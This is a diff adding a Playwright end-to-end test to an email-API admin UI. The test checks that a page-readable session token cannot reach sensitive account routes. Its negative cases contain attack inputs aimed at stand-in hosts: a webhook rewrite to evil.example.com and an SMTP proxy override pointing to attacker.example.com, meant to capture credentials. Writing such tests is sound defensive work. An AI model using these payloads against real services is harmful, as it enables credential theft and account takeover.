@@ -439,6 +439,75 @@ test.describe('admin shell', () => {
         expect(errors, errors.join('\n')).toHaveLength(0);
     });
 
+    test('the browse page session token is confined to what the browser needs', async ({ page }) => {
+        // The token is minted for the message browser's own fetches and sits in the page HTML,
+        // where any script on the page can read it - which is the difference from the HttpOnly
+        // session cookie it rides on. It used to face only the account binding, so it reached every
+        // api-tagged route naming that account, including the account edit that rewrites the
+        // account's webhook target and stored credentials.
+        await ensureAdminSession(page);
+        const url = await firstAccountUrl(page);
+        test.skip(!url, 'no account registered (standalone run)');
+
+        const accountId = url.split('/').pop();
+        await page.goto(`${url}/browse`);
+
+        const sessionToken = (await page.content()).match(/accessToken:\s*'(sess_[0-9a-f]{64})'/)?.[1];
+        expect(sessionToken, 'the browse page should embed a session token').toBeTruthy();
+
+        // Called from inside the page, which is the only place this credential works at all: its
+        // HMAC key is the session id sealed in the HttpOnly `ee` cookie, so a copy carried
+        // anywhere else authenticates nothing. That is also the shape of the risk being pinned
+        // here - a script on this page can read the token, and this is what it would reach.
+        const status = (method, path, body) =>
+            page.evaluate(
+                async args => {
+                    const res = await fetch(args.path, {
+                        method: args.method,
+                        headers: Object.assign({ Authorization: `Bearer ${args.tok}` }, args.body ? { 'content-type': 'application/json' } : {}),
+                        body: args.body ? JSON.stringify(args.body) : undefined
+                    });
+                    return res.status;
+                },
+                { method, path, body, tok: sessionToken }
+            );
+
+        // What the browser actually calls still works
+        expect(await status('GET', `/v1/account/${accountId}`)).toBe(200);
+        expect(await status('GET', `/v1/account/${accountId}/mailboxes`)).toBe(200);
+
+        // and the rest of the account's surface does not
+        expect(
+            await status('PUT', `/v1/account/${accountId}`, { webhooks: 'https://evil.example.com/collect' }),
+            'a page-readable token must not be able to rewrite the account'
+        ).toBe(403);
+        expect(await status('GET', `/v1/account/${accountId}/oauth-token`)).toBe(403);
+        expect(await status('POST', `/v1/account/${accountId}/export`, {})).toBe(403);
+
+        // Submitting IS allowed, so the payload field that decides where the SMTP session lands has
+        // to be refused separately - a proxy of the caller's choosing answers as the mail server
+        // and collects the account's credentials in plaintext, which is the same outcome as the
+        // oauth-token read refused above
+        expect(
+            await status('POST', `/v1/account/${accountId}/submit`, {
+                proxy: 'socks5://attacker.example.com:1080',
+                to: [{ address: 'nobody@ethereal.email' }],
+                subject: 'e2e proxy override',
+                text: 'x'
+            }),
+            'a page-readable token must not be able to redirect the SMTP session'
+        ).toBe(403);
+
+        // Last, because it destroys the credential: the binding is half the rule, and a route
+        // naming no account is out of scope by construction - so the instance-wide account listing
+        // is refused even though it resolves to the same read/account grant as the account read
+        // above. 401 rather than 403 because the binding is checked while validating the token: a
+        // request naming no account matches no stored one, so the credential does not resolve, and
+        // validateSessionToken() deletes a token presented against the wrong account.
+        expect(await status('GET', '/v1/accounts')).toBe(401);
+        expect(await status('GET', `/v1/account/${accountId}`), 'a mismatched account revokes the token').toBe(401);
+    });
+
     test('account browse page: ee-client widget initializes', async ({ page }) => {
         const errors = trackConsoleErrors(page);
         await ensureAdminSession(page);
